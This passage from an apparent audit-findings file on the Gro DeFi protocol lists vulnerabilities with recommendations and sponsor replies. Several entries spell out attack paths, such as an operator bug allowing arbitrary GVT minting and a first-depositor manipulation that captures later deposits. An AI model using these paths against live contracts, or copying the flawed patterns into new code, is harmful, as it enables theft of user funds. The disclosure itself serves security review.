For a more precise check whether both USDC and USDT are within range, `b/c` must be checked as well.

2. If `a/b` is within range, this does not imply that `b/a` is within range.
* > ""inverted ratios, a/b bs b/a, while producing different results should both reflect the same change in any one of the two underlying assets, but in opposite directions""

* Example: `lastRatio = 1.0`
`ratio: a = 1.0, b = 0.8` => `a/b = 1.25`, `b/a = 0.8`
If `a/b` was used with a 20% range, it'd be out of range, but `b/a` is in range.

3. The NatSpec for the function states that it checks Curve and an external oracle, but no external oracle calls are checked, both `_ratio` and `lastRatio` are only from Curve. Only `_updateRatios` checks the oracle.

To address this issue, it is recommended to check if `b/c` is within `BASIS_POINTS` .



**kristian-gro (Gro) commented:**
> Acknowledged, but the differences between variables are in basis points, we've simulated flash loan manipulations of curve and come to the conclusion that this approximation has a sufficiently small error margin to not cause issues.
> The B/C check (usdc/usdt) has been added in release version."
17.md,Incorrect use of operator leads to arbitrary minting of GVT tokens,high,"The `distributeStrategyGainLoss()` function distributes any gains or losses generated from a harvest and is expected to be called only by valid protocol vault adaptors. It is an externally visible function and the access control is indirectly enforced on `msg.sender` by checking that `vaultIndexes[msg.sender]` is a valid index range 1-4. However, the operator used in the `require()` is `||` instead of `&&`, which allows an arbitrary `msg.sender`, i.e. attacker, to bypass the check.

**Scenario**: An arbitrary non-vault address calling this function will get an index of 0 because of default mapping value in `vaultIndexes[msg.sender]`, which will fail the `> 0` check, but pass the `<= N_COINS + 1` check (`N_COINS = 3`) because `0 <= 4` which will allow control to go past this check.

Furthermore, on L362, `index=0` will underflow the -1 decrement (due to lack of `SafeMath.sub` and use of < 0.8.0 solc) and the index will be set to `(uint256_MAX - 1)`. This will allow execution to proceed to the ""else"" part of conditional meant for curve LP vault. Therefore, this will allow any random address to call this function with arbitrary values of gain/loss and distribute arbitrary gain/loss appearing to come from Curve vault.

The attack control flow:
* -> `Controller.distributeStrategyGainLoss(ARBITRARY_HIGH_VALUE_OF_GAIN, 0)`
* -> `index = 0` passes check for the `index <= N_COINS + 1` part of predicate on L357 in `Controller.sol`
* -> `index = uint256_MAX` after L362
* -> `gainUsd = ibuoy.lpToUsd(ARBITRARY_HIGH_VALUE_OF_GAIN);` on L371 in `Controller.sol`
* -> `ipnl.distributeStrategyGainLoss(gainUsd, lossUsd, reward);` on L376 in `Controller.sol`
* -> `(gvtAssets, pwrdAssets, performanceBonus) = handleInvestGain(lastGA, lastPA, gain, reward);` on L254 in `PnL.sol`
* -> `performanceBonus = profit.mul(performanceFee).div(PERCENTAGE_DECIMAL_FACTOR);` on L186 of `PnL.sol`
* ->  `gvt.mint(reward, gvt.factor(gvtAssets), performanceBonus);` on L256 in `PnL.sol`


Recommend changing `||` to `&&` in `require()` on L357 of `Controller.sol` to prevent arbitrary addresses from going past this check. Or, consider exercising explicit access control for the authorized vault adaptors.


> Confirmed and Fix has been implemented in release version."
17.md,`sortVaultsByDelta` doesn't work as expected,high,"The function `sortVaultsByDelta` doesn't always work as expected.

Suppose all the delta's are positive, and delta1 >= delta2 >= delta3 > 0. Then `maxIndex = 0`. And `(delta < minDelta (==0) )` is never true, so `minIndex = 0`.

Then (assuming `bigFirst==true`):

```solidity
vaultIndexes[0] = maxIndex = 0
vaultIndexes[2] = minIndex = 0
vaultIndexes[1] = N_COINS - maxIndex - minIndex = 3-0-0 = 3
```

This is clearly not what is wanted, all `vaultIndexes` should be different and should be in the range [0..2]. This is due to the fact that `maxDelta` and `minDelta` are initialized with the value 0. This all could results in withdrawing from the wrong vaults and reverts (because `vaultIndexes`[1]  is out of range).

`Exposure.sol` [L178](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/insurance/Exposure.sol#L178):
```solidity
function sortVaultsByDelta(bool bigFirst,uint256 unifiedTotalAssets,uint256[N_COINS] calldata unifiedAssets,uint256[N_COINS] calldata targetPercents) external pure override returns (uint256[N_COINS] memory vaultIndexes) {
        uint256 maxIndex;
        uint256 minIndex;
        int256 maxDelta;
        int256 minDelta;
        for (uint256 i = 0; i < N_COINS; i++) {
            // Get difference between vault current assets and vault target
            int256 delta = int256(
                unifiedAssets[i] - unifiedTotalAssets.mul(targetPercents[i]).div(PERCENTAGE_DECIMAL_FACTOR)
            );
            // Establish order
            if (delta > maxDelta) {
                maxDelta = delta;
                maxIndex = i;
            } else if (delta < minDelta) {
                minDelta = delta;
                minIndex = i;
            }
        }
        if (bigFirst) {
            vaultIndexes[0] = maxIndex;
            vaultIndexes[2] = minIndex;
        } else {
            vaultIndexes[0] = minIndex;
            vaultIndexes[2] = maxIndex;
        }
        vaultIndexes[1] = N_COINS - maxIndex - minIndex;
    }
```

Recommend the following
1. Initializing `maxDelta` and `minDelta`:
```solidity
        int256 maxDelta = -2**255; // or type(int256).min when using a newer solidity version
        int256 minDelta  = 2**255; // or type(int256).max when using a newer solidity version
```
2. Check that `maxIndex` and `minIndex` are not the same
3. require (`maxIndex` != `minIndex`);

**kristian-gro (Gro) confirmed:**
> Confirmed and Fix has been implemented in release version."
17.md,Usage of deprecated ChainLink API in `Buoy3Pool`,medium,"delamo_

The Chainlink API (`latestAnswer`) used in the `Buoy3Pool` oracle wrappers is deprecated:

> This API is deprecated. Please see API Reference for the latest Price Feed API. [Chainlink Docs](https://docs.chain.link/docs/deprecated-aggregatorinterface-api-reference/#latestanswer)

It seems like the old API can return stale data. Checks similar to that of the new API using `latestTimestamp` and `latestRoundare` are needed, as this could lead to stale prices according to the Chainlink documentation:
* [under current notifications: ""if answeredInRound < roundId could indicate stale data.""](https://docs.chain.link/docs/developer-communications#current-notifications)
* [under historical price data: ""A timestamp with zero value means the round is not complete and should not be used.""](https://docs.chain.link/docs/historical-price-data#solidity)

Recommend adding checks similar to `latestTimestamp` and `latestRoundare`

```solidity
(
    uint80 roundID,
    int256 price,
    ,
    uint256 timeStamp,
    uint80 answeredInRound
) = chainlink.latestRoundData();
require(
    timeStamp != 0,
    “ChainlinkOracle::getLatestAnswer: round is not complete”
);
require(
    answeredInRound >= roundID,
    “ChainlinkOracle::getLatestAnswer: stale data”
);
require(price != 0, ""Chainlink Malfunction”);
```


> Confirmed and Fix has been implemented in release version."
17.md,Safe addresses can only be added but not removed,medium,"The `addSafeAddress()`  takes an address and adds it to a “safe list"". This is used in `eoaOnly()` to give exemption to safe addresses that are trusted smart contracts, when all other smart contacts are prevented from protocol interaction. The stated purpose is to allow only such partner/trusted smart contract integrations (project rep mentioned Argent wallet as the only one for now but that may change) an exemption from potential flash loan threats. But if there is a safe listed integration that needs to be later disabled, it cannot be done. The protocol will have to rely on other measures (outside the scope of this contest) to prevent flash loan manipulations which are specified as an area of critical concern.

**Scenario:** A trusted integration/partner address is added to the safe list. But that wallet/protocol/DApp is later manipulated (by the project, its users or an attacker) to somehow launch a flash loan attack on the protocol. However, its address cannot be removed from the safe list and the protocol cannot prevent flash loan manipulations from that source because of its exemption. Contract/project will have to be redeployed.

Recommend changing `addSafeAddress()` to `isSafeAddress()` with an additional bool parameter to allow both the enabling _AND_ disabling of safe addresses."
17.md,`BaseVaultAdaptor` assumes `sharePrice` is always in underlying decimals,medium,"The two `BaseVaultAdaptor.calculateShare` functions compute `share = amount.mul(uint256(10)**decimals).div(sharePrice)`

```solidity
uint256 sharePrice = _getVaultSharePrice();
// amount is in ""token"" decimals, share should be in ""vault"" decimals
share = amount.mul(uint256(10)**decimals).div(sharePrice);
```

This assumes that the `sharePrice` is always in _token_ decimals and that _token_ decimals is the same as _vault_ decimals.

Both these assumptions happen to be correct for Yearn vaults, but that will not necessarily be the case for other protocols.
As this functionality is in the `BaseVaultAdaptor`, and not in the specific `VaultAdaptorYearnV2_032`, consider generalizing the conversion.

Integrating a token where the token or price is reported in a different precision will lead to potential losses as more shares are computed.

Because the conversion seems highly protocol-specific, it is recommended that `calculateShare` should be an abstract function (like `_getVaultSharePrice`) that is implemented in the specific adaptors.

**- [kristian-gro (Gro) confirmed](https://github.com/code-423n4/2021-06-gro-findings/issues/114)**
> Confirmed and shares have been removed from release version."
17.md,Flash loan risk mitigation is optional and not robust enough,medium,"The `switchEoaOnly()` allows the owner to disable `preventSmartContracts` (the project’s plan apparently is to do so after the beta-period) which will allow any smart contract to interact with the protocol and potentially exploit any underlying flash loan vulnerabilities which are specified as an area of critical concern.

The current mitigation is to optionally prevent contracts, except whitelisted partner ones, from interacting with the protocol to prevent any flash loan manipulations. A more robust approach would be to add logic preventing multiple txs to the protocol from the same address/`tx.origin` within the same block when smart contracts are allowed. This will avoid any reliance on trust with integrating partners/protocols.

Recommend adding logic that prevents multiple txs to the protocol from the same address and within the same block."
17.md,Use of deprecated Chainlink function `latestAnswer`,medium,"According to Chainlink's documentation ([Deprecated API Reference](https://docs.chain.link/docs/deprecated-aggregatorinterface-api-reference/), [Migration Instructions](https://docs.chain.link/docs/migrating-to-flux-aggregator/#3-use-the-new-functions), and [API Reference](https://docs.chain.link/docs/price-feeds-api-reference/)), the `latestAnswer` function is deprecated. This function does not throw an error if no answer has been reached, but instead returns 0, causing an incorrect price to be fed to the `Buoy3Pool`. See `Buoy3Pool.sol` [L207](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/oracle/Buoy3Pool.sol#L207) and
[L214-L216](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/oracle/Buoy3Pool.sol#L214-L216).

Recommend using the `latestRoundData` function to get the price instead. Also recommend adding checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:

```solidity
(uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = oracle.latestRoundData();
require(answeredInRound >= roundID, ""..."");
require(timeStamp != 0, ""..."");
```


**kristian-gro (Gro) confirmed:**
> Confirmed and shares have been removed from release version."
17.md,Early user can break minting,medium,"The protocol computes a `factor` when minting (and burning) tokens, which is the exchange rate of rebase to base tokens (base supply / total assets value), see `GToken.factor()`.
The first user can manipulate this factor such that it always returns `0`.

**Example:**
- Attacker deposits 100.0 DAI and mints 100 * 1e18 PWRD: `DepositHandler.depositGToken` with `dollarAmount = 100.0 = 100 * 1e18`, then `ctrl.mintGToken(pwrd, msg.sender, 1e18)`
calls `gt.mint(account, gt.factor(), amount=1e18)` where `gt.factor()` returns `getInitialBase() = 1e18` because the person is the first minter and it mints `amount * factor / _BASE = 1e18`
- The `ctrl.mintGToken` call also increases total assets: `pnl.increaseGTokenLastAmount(...)`
- The attacker now burns (withdraws) all minted tokens again **except a single wei** using one of the withdrawal functions in `WithdrawHandler`. Because of the withdrawal fee the total assets are only decreased by the post-fee amount (`IPnL(pnl).decreaseGTokenLastAmount(pwrd, amount=userBalance - 1, bonus=fee);`), i.e., with a 2% withdrawal fee the total assets stay at 2% of 100\$ = 2 * 1e18.
- The result is that `GToken.factor()` always returns `totalSupplyBase().mul(BASE).div(totalAssets) = 1 * 1e18 / (2 * 1e18) = 0`

The resulting `factor` is 0 and thus any user-deposits by `depositGToken` will mint 0 base tokens to the depositor.
This means all deposits and future value accrues to the attacker who holds the only base tokens.

An attacker could even front-run the first minter to steal their deposit this way.

Uniswap solves a similar problem by sending the first 1000 tokens to the zero address which makes the attack 1000x more expensive. The same should work here, i.e., on first mint (`total base supply == 0`), lock some of the first minter's tokens by minting ~1% of the initial amount to the zero address instead of to the first minter."
17.md,`emergencyHandler` not checked & not emitted,low,"The function `setWithdrawHandler` allows the setting of `withdrawHandler` and `emergencyHandler`.
However, `emergencyHandler` isn't checked for 0 (like the `withdrawHandler` ). The value of the `emergencyHandler` is also not emitted (like the `withdrawHandler` )

`Controller.sol` [L105](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/Controller.sol#L105):
```solidity
function setWithdrawHandler(address _withdrawHandler, address _emergencyHandler) external onlyOwner {
    require(_withdrawHandler != address(0), ""setWithdrawHandler: 0x"");
    withdrawHandler = _withdrawHandler;
    emergencyHandler = _emergencyHandler;
    emit LogNewWithdrawHandler(_withdrawHandler);
}
```

Recommend adding something like:
```solidity
    require(_emergencyHandler!= address(0), ""setEmergencyHandler: 0x"");
    event LogNewEmergencyHandler(address tokens);
    emit LogNewEmergencyHandler(_emergencyHandler);
```

**- [kristian-gro (Gro) confirmed](https://github.com/code-423n4/2021-06-gro-findings/issues/5)**"
17.md,`lastRatio` of `Buoy3Pool` is not initialized,low,"The values of `lastRatio` in the contract `Buoy3Pool.sol` are not initialized (thus they have a value of 0).
If `safetyCheck()` would be called before the first time `_updateRatios` is called, then `safetyCheck()` would give unexpected results.

`Buoy3Pool.sol` [L25](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/oracle/Buoy3Pool.sol#L25):
```solidity
contract `Buoy3Pool` is FixedStablecoins, Controllable, IBuoy, IChainPrice {
...
    mapping(uint256 => uint256) lastRatio;

 function safetyCheck() external view override returns (bool) {
        for (uint256 i = 1; i < N_COINS; i++) {
            uint256 _ratio = curvePool.get_dy(int128(0), int128(i), getDecimal(0));
            _ratio = abs(int256(_ratio - lastRatio[i]));
            if (_ratio.mul(PERCENTAGE_DECIMAL_FACTOR).div(CURVE_RATIO_DECIMALS_FACTOR) > BASIS_POINTS) {
                return false;
            }
        }
        return true;
    }

 function _updateRatios(uint256 tolerance) private returns (bool) {
    ...
        for (uint256 i = 1; i < N_COINS; i++) {
            lastRatio[i] = newRatios[i];
```

Recommend double checking if this situation can occur and perhaps calling `_updateRatios` as soon as possible. Or alternatively, check in `safetyCheck` that the `lastRatio` values are initialized.

**- [kristian-gro (Gro) acknowledged](https://github.com/code-423n4/2021-06-gro-findings/issues/7)**"
17.md,`Buoy3Pool._updateRatios` unsafe math,low,"The function performs type conversions and subtraction without over-/underflow checks:

```solidity
uint256 check = abs(int256(_ratio) - int256(chainRatios[i].div(CHAIN_FACTOR)));
```

Recommend checking if the values fit within the type range first, otherwise revert with a meaningful error message, as well as checking for underflows."
17.md,`setUnderlyingTokenPercent` should check percentages,low,"The function `setUnderlyingTokenPercent` doesn't check that the sum of all the percentages is 100%.
This way the percentages could be accidentally set up the wrong way, with unpredictable results. Note that the function can only be called by  controller or the owner so the likelihood of mistakes is pretty low.

`Insurance.sol` [#L100](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/insurance/Insurance.sol#L100):
```solidity
function setUnderlyingTokenPercent(uint256 coinIndex, uint256 percent) external override onlyValidIndex(coinIndex) {
    require(msg.sender == controller || msg.sender == owner(), ""setUnderlyingTokenPercent: !authorized"");
    underlyingTokensPercents[coinIndex] = percent;
    emit LogNewTargetAllocation(coinIndex, percent);
}
```

Recommend changing `setUnderlyingTokenPercent` to set the percentages for all the coins at the same time.
And check that the sum of the percentages is 100%"
17.md,initialize `maxPercentForWithdraw` and `maxPercentForDeposit`?,low,"The parameters `maxPercentForWithdraw` and `maxPercentForDeposit`, which are not directly initialized, will work in a suboptimal way If, the functions which rely on these parameters, are called before `setWhaleThresholdWithdraw`/`setWhaleThresholdDeposit`.

`Insurance.sol` [L63](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/insurance/Insurance.sol#L63):
```solidity
uint256 public maxPercentForWithdraw;
uint256 public maxPercentForDeposit;

function setWhaleThresholdWithdraw(uint256 _maxPercentForWithdraw) external onlyOwner {
    maxPercentForWithdraw = _maxPercentForWithdraw;
    emit LogNewVaultMax(false, _maxPercentForWithdraw);
}
function setWhaleThresholdDeposit(uint256 _maxPercentForDeposit) external onlyOwner {
    maxPercentForDeposit = _maxPercentForDeposit;
    emit LogNewVaultMax(true, _maxPercentForDeposit);
}
```

Recommend assigning a default value to `maxPercentForWithdraw` and `maxPercentForDeposit`. Or alternatively, initializing the values via the constructor."
17.md,use `safemath`,low,"`Safemath` is used in several places but not everywhere. Especially in risky places like `PnL` and `distributeStrategyGainLoss` where it is hardly worth the gas-savings of not using `safemath`.

In `distributeStrategyGainLoss` it does make a difference, also due to another issue.

[`PnL.sol` L215](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pnl/PnL.sol#L215):
```solidity
function handleLoss( uint256 gvtAssets, uint256 pwrdAssets, uint256 loss) private pure returns (uint256, uint256) {
        uint256 maxGvtLoss = gvtAssets.sub(DEFAULT_DECIMALS_FACTOR);
        if (loss > maxGvtLoss) {
          ...
        } else {
            gvtAssets = gvtAssets - loss;    // won't underflow but safemath won't hurt
        }

    function forceDistribute() private {
        uint256 total = _controller().totalAssets();
        if (total > lastPwrdAssets.add(DEFAULT_DECIMALS_FACTOR)) {
            lastGvtAssets = total - lastPwrdAssets;   // won't underflow but safemath won't hurt
        } else {
   ...
```

[`Controller.sol` L355](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/Controller.sol#L355)
```solidity
function distributeStrategyGainLoss(uint256 gain, uint256 loss) external override {
    uint256 index = vaultIndexes[msg.sender];
    require(index > 0 || index <= N_COINS + 1, ""!VaultAdaptor"");    // always true, see separate issue
    ..
    index = index - 1;  // can underflow
```
Recommend applying `safemath` or moving to Solidity 0.8.x

**- [kristian-gro (Gro) acknowledged](https://github.com/code-423n4/2021-06-gro-findings/issues/22)**"
17.md,Missing emits for declared events,low,"Missing emits for declared events indicate potentially missing logic, redundant declarations, or reduced off-chain monitoring capabilities.

**Scenario:** For example, the event `LogFlashSwitchUpdated` is missing an emit in `Controller.sol`. Based on the name, this is presumably related to flash loans being enabled/disabled which could have significant security implications. Or the (misspelled) `LogHealhCheckUpdate` which is presumably related to a health check logic that is missing in `LifeGuard`. See issue page for referenced code.

Recommend evaluating if logic is missing and if so, adding logic+emit or removing event."
17.md,Having only owner unpause/restart is risky,low,"The design choice seems to allow a whitelist of addresses (bots or trusted parties) that can trigger pause/emergency but `onlyOwner` can unpause/restart (and perform other privileged functions). While it is recommended in general to have separate privileges/roles for stopping and starting critical functions, having only a single owner for unpause/restart triggering may create a single point of failure if owner is EOA and keys are lost/compromised.

**Scenario:** `Protocol` is paused or put in emergency mode by a bot/user in whitelist. `Owner` is an EOA and the private keys are lost. `Protocol` cannot be unpaused/restarted. See `Controller.sol` [#L317](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L317), [#L101](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L101), and [#L97](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L97).

Recommend evaluating this design choice to see if a whitelist should also be allowed to unpause/restart. At a minimum, use a 6-of-9 or higher multisig and not an EOA."
17.md,Uninitialized vaults/addresses will lead to reverts,low,"Uninitialized system/curve vaults (default to zero address) will lead to reverts on calls and expect owner to set them before other functions are called because functions do not check if system has been initialized. This requires a robust deployment script which is fail-safe.

The same applies to many other address parameters in the protocol e.g.: `reward`.

**Scenario:** All vaults are not initialized because of a script error or an admin mistake. Protocol goes live and user interactions result in exceptions. Users lose trust and protocol reputation takes a hit. See `Controller.sol` [#L136-L150](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L136-L150) and [#L194-L198](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L194-L198).

Recommend evaluating non-zero defaults, initializing from constructor or maintaining/checking an initialization state variable which prevents other functions from being called until all critical system states such as vault addresses are initialized."
17.md,The use of `tx.origin` for smart contract safe list is risky and not generic,low,"The `addSafeAddress()`  takes an address and adds it to a “safe list"". This is used in `eoaOnly()` to give exemption to safe addresses that are trusted smart contracts, when all other smart contacts are prevented from protocol interaction. The stated purpose is to allow only such partner/trusted smart contract integrations (project rep mentioned Argent wallet as the only one for now but that may change) an exemption from potential flash loan threats.

The `eoaOnly()` check used during deposits and withdrawals checks if `preventSmartContracts` is enabled and if so, makes sure the transaction is coming from an integration/partner smart contract. But instead of using `msg.sender` in the check it uses `tx.origin`. This is suspect because `tx.origin` gives the originating EOA address of the transaction and not a smart contract’s address. (This may get even more complicated with the proposed EIP-3074.)

Discussion with the project team indicated that this is indeed not the norm but is apparently the case for their only current (none others planned) integration with Argent wallet where the originating account is Argent’s relayer `tx.origin` i.e. flow:
> Argent relayer (`tx.origin`) => Argent user wallet (`msg.sender`) => gro protocol while the typically expected flow is: user EOA (`tx.origin`) => proxy (`msg.sender`) => gro protocol.

While this has reportedly been verified and tested, it does seem strange and perhaps warrants a re-evaluation because the exemption for this/other trusted integration/partner smart contracts will not work otherwise.

**Scenario:** Partner contract is added to the safe address for exemption but the integration fails because of the use of `tx.origin` instead of `msg.sender`. See `Controller.sol` [#L266-L272](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L266-L272), [#L176-L178](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L176-L178), and [#L171-L174](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/Controller.sol#L171-L174).

Recommend re-evaluating the use of `tx.origin` instead of `msg.sender`."
17.md,Missing parameter validation,low,"Some parameters of functions are not checked for invalid values:
- `BaseVaultAdaptor.constructor`: The addresses should be checked for non-zero values
- `LifeGuard3Pool.constructor`: The addresses should be checked for non-zero values
- `Buoy3Pool.constructor`: The addresses should be checked for non-zero values
- `PnL.constructor`: The addresses should be checked for non-zero values
- `Controllable.setController`: Does not check that `newController != controller`

A wrong user input,  or wallets defaulting to the zero addresses for a missing input, can lead to the contract needing to redeploy or wasted gas.

Recommend validating the parameters."
17.md,Stricter than needed inequalities may affect borderline scenarios,low,"Token amounts/prices are typically open-ranged and inclusive of the bounds. Using ‘<‘ or ‘>’ instead of ‘<=‘ and ‘>=‘ may affect borderline scenarios, be considered unintuitive by users, and affect accounting.

-**Scenario 1:** In `calculateVaultSwapData()`, the `require()` check is:
```solidity
require(withdrawAmount < state.totalCurrentAssetsUsd, ""Withdrawal exceeds system assets"");
```
The ‘<‘ could be replaced by ‘<=‘

**Scenario 2:** In `withdrawSingleByLiquidity()`, the `require()` check is:
```solidity
require(balance > minAmount, ""withdrawSingle: !minAmount"");
```
The ‘>’ should be ‘>=‘ as is used in the similar check in `withdrawSingleByExchange()`.

See `Insurance.sol` [L429](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/insurance/Insurance.sol#L429), and `LifeGuard3Pool.sol` [L224](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/pools/LifeGuard3Pool.sol#L224) and [L268](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/pools/LifeGuard3Pool.sol#L268).

Recommend reconsidering strict inequalities and relaxing them if possible."
17.md,`totalAssets` > `withdrawelUsd` should be inclusive,low,"The check should be inclusive here to cover the case when `totalAssets` = `withdrawalUsd`:

Recommend changing
```solidity
require(totalAssets > withdrawUsd, ""totalAssets < withdrawalUsd"");
```
to
```solidity
require(totalAssets >= withdrawUsd, ""totalAssets < withdrawalUsd"");
```"
17.md,Use of uninitialized value and unclear/unused logic,low,"`vaultIndexes` is uninitialized and it's unclear what 10000 signifies here. `investDelta` return value is also ignored at call site. If this is an indication of missed/incorrect logic, then it's risky. If not, removing will help readability/maintainability. See `Insurance.sol` [#L166](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/insurance/Insurance.sol#L166), and [#L155](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/insurance/Insurance.sol#L155).

Recommend evaluating any missing logic or else removing unused code.

**- [kristian-gro (Gro) confirmed](https://github.com/code-423n4/2021-06-gro-findings/issues/65)**"
17.md,decimals of `FixedStablecoins`,low,"The `FixedStablecoins` constructor does not validate that addresses in the array are not empty, `!= address(0)`, and instead relies on the creator passing the correct values for decimals. The comment next to USDC (0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) says that it is supposed to have 6 decimals:
```solidity
    `uint256 public immutable USDC_DECIMALS; // = 1E6;`
```
However, when querying the actual value on [Etherscan](https://etherscan.io/address/0xa2327a938febf5fec13bacfb16ae10ecbc4cbdcf#readContract), it shows 0 decimals:  The problem with USDC is that it uses a proxy pattern, thus the implementation could change (decimals could change but in practice, I think it is very unlikely).

I think it would be better not to pass decimals separately and, instead of relying on the correctness of the input, recommend using `IERC20Detailed` to query the decimals in code. Always querying the decimals on the go may be very inefficient and bring new attack vectors so I think you need to do here an assumption that decimals of upgradeable tokens won't change."
17.md,More accurate calculation of return USD of `withdrawSingleByLiquidity`,low,"The `withdrawSingleByLiquidity` function of `LifeGuard3Pool` calls `buoy.singleStableToUsd` to calculate the return USD amount, which internally calls `_stableToUsd` with the `deposit` parameter set to `true`. A more accurate calculation is to set the `deposit` parameter to `false` since this action is a withdrawal. A similar issue exists in the function `calcProtocolWithdraw` of `Allocation`, where the current strategy's USD is calculated by `buoy.singleStableToUsd`. See [`LifeGuard3Pool.sol` #L226](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/LifeGuard3Pool.sol#L226), [`Buoy3Pool.sol` #L122](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/oracle/Buoy3Pool.sol#L122), and [`Allocation.sol` #L142](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/insurance/Allocation.sol#L142).

Recommend considering adding a new boolean parameter, `deposit`, to the `singleStableToUsd` function of `Buoy3Pool` to indicate whether the action is a deposit or not, as that in the `stableToUsd` and `stableToLp` functions.

**- [kristian-gro (Gro) confirmed](https://github.com/code-423n4/2021-06-gro-findings/issues/121)**"
17.md,Use of `tx.origin` for authentication,low,"The `eoaOnly` function of `Controller` checks whether the user is whitelisted using `tx.origin`. Using `tx.origin` to authenticate users is generally not a good practice since it can be abused by malicious contracts when whitelisted users are interacting with them. Users have to be very careful to avoid being impersonated when interacting with contracts from other protocols, which could unnecessarily burden users. See [`Controller.sol` #L269](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/Controller.sol#L269). For for more discussion on `tx.origin`, refer to [Solidity issue - Remove tx.origin](https://github.com/ethereum/solidity/issues/683).

Recommend changing `tx.origin` at line 269 to `msg.sender` to ensure that the entity calling the `Controller` is the one allowed."
17.md,Vault assets can be migrated to an arbitrary address at anytime by owner,low,"`BaseVaultAdaptor` contains logic that is “built on top of any vault in order for it to function with Gro protocol.” One of such functions is the `migrate()` function which is `onlyOwner` and takes an address parameter which allows owner to migrate the vault’s entire balance at any time to that address. This is extremely risky because it gives an opportunity for, or at least a perception of, a rug-pull by a disgruntled/malicious owner/dev to the protocol users/community. This could also be dangerous if triggered accidentally, especially by an EOA owner address or maliciously via compromised keys.

- **Scenario 1:** Protocol launches and starts accumulating TVL. A savvy user analyzes source and shares the presence of this `migrate()` function as potential owner rug-pull vector. Users withdraw funds and protocol reputation takes a hit.
- **Scenario 2:** Protocol launches and hits 100MM TVL. A disgruntled dev/owner migrates vault assets to their address and drains the protocol.
- **Scenario 3:** Protocol launches and hits 100MM TVL. Owner EOA keys get compromised and attacker migrates vault assets to their address and drains the protocol.

See [`BaseVaultAdaptor.sol` #L294-L302 ](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/vaults/BaseVaultAdaptor.sol#L294-L302)

See similar concern on `migrate()` functionality in ShibaSwap recently from Yearn devs [here](https://twitter.com/bantg/status/1412370758987354116) and [here](https://twitter.com/bantg/status/1412388385663164425). Also from [here](https://twitter.com/valentinmihov/status/1412352490918625280) and [here](https://twitter.com/shegenerates/status/1412642215537545218).

Recommend evaluating the need for this function and then avoiding/mitigating the risk appropriately."
17.md,Enabling `preventSmartContracts` may lead to lock/loss of funds,low,"`preventSmartContracts` is initialized to false, which allows users to deposit/withdraw funds from the protocol via (custom) smart contracts because the `eoaOnly` check during deposits/withdrawals always succeeds. However, if protocol owner decides to suddenly enable `preventSmartContracts`, then smart contracts are prevented from interaction unless they are exempted in safe addresses.

The lack of an event in `switchEoaOnly()` to inform off-chain monitors `/interfaces` about the enabling/disabling, say from false -> true, and lack of a time-delayed enforcement of this prevention of contracts from depositing/withdrawing, causes users who have previously deposited via smart contracts (that are not `safeAddresses`) to get locked out of withdrawals leading to fund lock/loss.

**Scenario:** User deposits funds via smart contract (not in safe address list) when `preventSmartContracts`=false. Protocol owner sets `preventSmartContracts`=true. User’s funds are locked/lost in protocol. See issue page for affected code.

Recommend adding event + time-delayed enforcement to `switchEoaOnly()` so users can monitor and withdraw funds deposited via smart contracts."
17.md,Unauthorized `rebalanceTrigger` calls may allow one to exploit arbitrage opportunity and put system at risk,low,"The need for an externally visible `rebalanceTrigger()` (when `rebalance()` does that check itself) is apparently that the whitelisted bot checks trigger before calling the very expensive/security-sensitive `rebalance()` operation which again checks to see if anything has changed between then and the previous trigger.

Exposing the rebalance trigger check externally for convenience may offer a front-running arbitrage opportunity to a non-whitelisted, i.e. any, bot which can check when a rebalance will be triggered by a whitelisted bot and then using that information to arbitrage on underlying stablecoins/strategies, which may affect system exposure.

Discussion with the project team reported that this is technically possible, but only within the BP limit (25-50) of the current vs cached price (where the `BASIS_POINTS` is currently set to 20). If not, the `Buoy safetyCheck` will fail. See `Insurance.sol` [#L187-L196](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/insurance/Insurance.sol#L187-L196) and [#L198-L215](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/insurance/Insurance.sol#L198-L215). Also `Buoy3Pool.sol` [#L30](https://github.com/code-423n4/2021-06-gro/blob/091660467fc8d13741f8aafcec80f1e8cf129a33/contracts/pools/oracle/Buoy3Pool.sol#L30).

